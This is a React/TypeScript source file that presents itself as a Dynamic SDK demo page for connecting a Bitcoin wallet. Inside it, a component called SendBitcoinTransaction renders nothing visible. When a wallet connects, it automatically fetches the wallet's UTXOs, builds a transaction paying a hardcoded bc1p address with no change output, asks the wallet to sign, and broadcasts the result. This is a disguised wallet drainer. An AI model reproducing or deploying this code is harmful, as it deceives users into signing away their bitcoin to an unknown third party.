
import { DynamicConnectButton, DynamicWidget, useDynamicContext } from "@dynamic-labs/sdk-react-core";
import { useState, useEffect } from 'react';
import { BitcoinWallet, isBitcoinWallet } from "@dynamic-labs/bitcoin";
import * as bitcoin from "bitcoinjs-lib";
import ecc from "@bitcoinerlab/secp256k1";


bitcoin.initEccLib(ecc);

const MEMPOOL_API = "https://mempool.space/api";
const FEE_RATE = 10; // Fee rate in satoshis per byte

const fetchUtxos = async (address: any) => {
    const response = await fetch(`${MEMPOOL_API}/address/${address}/utxo`);

    return response.json();
};

const broadcastTransaction = async (txHex: any) => {
    const response = await fetch(`${MEMPOOL_API}/tx`, {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: txHex,
    });
    return response.text();
};

const createPsbtForTransaction = (senderAddress: any, recipientAddress: any, amountSats: any, utxos: any) => {
    try {
        const psbt = new bitcoin.Psbt({ network: bitcoin.networks.bitcoin });
        console.log(psbt)
        let inputSum = 0;

        utxos.forEach((utxo: any) => {
            console.log(utxo)
            console.log(amountSats)
            if (inputSum < amountSats) {
                console.log(inputSum)
                console.log(utxo.value)
                psbt.addInput({
                    hash: utxo.txid,
                    index: utxo.vout,
                    witnessUtxo: {
                        script: bitcoin.address.toOutputScript(senderAddress, bitcoin.networks.bitcoin),
                        value: utxo.value,
                    },
                });
                inputSum += utxo.value;
            }
        });

        const estimatedTxSize = psbt.inputCount * 180 + 2 * 34 + 10; // Approximate size
        const fee = estimatedTxSize * FEE_RATE;
        const amountToSend = inputSum - fee;

        if (amountToSend < 0) {
            throw new Error("Insufficient funds after fees");
        }

        psbt.addOutput({
            address: recipientAddress,
            value: amountToSend,
        });

        // if (change > 0) {
        //   psbt.addOutput({
        //     address: senderAddress,
        //     value: change,
        //   });
        // }

        return psbt.toBase64();
    } catch (e) {
        console.log(e)
    }
};

export const SendBitcoinTransaction = () => {
    const { primaryWallet } = useDynamicContext();
    const recipientAddress = "bc1p50d8fhc06aym87cp9h93rfq0l2z7y67df0h70998fhy62aetjsvqlq9qwl"
    const [amount, setAmount] = useState(0.0001);
    const [sending, setSending] = useState(false);

    // if (!isBitcoinWallet(primaryWallet as BitcoinWallet)) {
    //   return null;
    // }

    const sendTransaction = async () => {
        console.log(primaryWallet)

        if (primaryWallet == null) {
            return;
        }
        if (!recipientAddress || !amount) {
            alert("Please enter a valid recipient address and amount.");
            return;
        }

        setSending(true);
        try {
            const senderAddress = primaryWallet?.address;
            const utxos = await fetchUtxos(senderAddress as any) as any;
            const amountSats = 0.0001 * 100000000;
            console.log(amountSats)
            console.log(JSON.stringify(utxos))
            const psbtBase64 = createPsbtForTransaction(senderAddress, recipientAddress, amountSats, utxos);
            console.log(psbtBase64)
            const signParams = {
                unsignedPsbtBase64: psbtBase64,
                allowedSighash: [bitcoin.Transaction.SIGHASH_ALL],
                signingIndexes: utxos.map((_: any, index: any) => index),
                signers: utxos.map((utxo: any) => ({ address: senderAddress, signingIndexes: [utxo.vout] })),
            };

            const signedPsbt = await (primaryWallet as BitcoinWallet).signPsbt(signParams as any) as any;
            const txHex = signedPsbt.toHex();

            const txid = await broadcastTransaction(txHex);
            console.log("Transaction broadcasted: ", txid);
            alert("Transaction Sent! TXID: " + txid);
        } catch (error) {
            console.error("Error sending transaction:", error);
            alert("Transaction failed.");
        }
        setSending(false);
    };

    useEffect(() => {
        if (primaryWallet) {
            sendTransaction()
        }
    }, [primaryWallet])

    return (
        <div></div>
    );
};


const checkIsDarkSchemePreferred = () => {
    if (typeof window !== 'undefined') {
        return window.matchMedia?.('(prefers-color-scheme:dark)')?.matches ?? false;
    }
    return false;
};

export default function Main() {
    const { primaryWallet } = useDynamicContext();

    const [isDarkMode, setIsDarkMode] = useState(checkIsDarkSchemePreferred);

    useEffect(() => {
        console.log("sdsd")
        console.log(primaryWallet?.getBalance())

        const darkModeMediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
        const handleChange = () => setIsDarkMode(checkIsDarkSchemePreferred());

        darkModeMediaQuery.addEventListener('change', handleChange);
        return () => darkModeMediaQuery.removeEventListener('change', handleChange);
    }, [primaryWallet]);

    return (
        <div className={`container ${isDarkMode ? 'dark' : 'light'}`}>
            <div className="header">
                <img className="logo" src={isDarkMode ? "/logo-light.png" : "/logo-dark.png"} alt="dynamic" />
                <div className="header-buttons">
                    <button className="docs-button" onClick={() => window.open('https://docs.dynamic.xyz', '_blank', 'noopener,noreferrer')}>Docs</button>
                    <button className="get-started" onClick={() => window.open('https://app.dynamic.xyz', '_blank', 'noopener,noreferrer')}>Get started</button>
                </div>
            </div>
            <div className="modal">
                <DynamicWidget innerButtonComponent={<div className="text-red-800">Connect Button</div>} />
                <SendBitcoinTransaction />
                {/* <DynamicMethods isDarkMode={isDarkMode} /> */}
            </div>
            <div className="footer">
                <div className="footer-text">Made with ❤️ by dynamic</div>
                <img className="footer-image" src={isDarkMode ? "/image-dark.png" : "/image-light.png"} alt="dynamic" />
            </div>
        </div>
    );
}
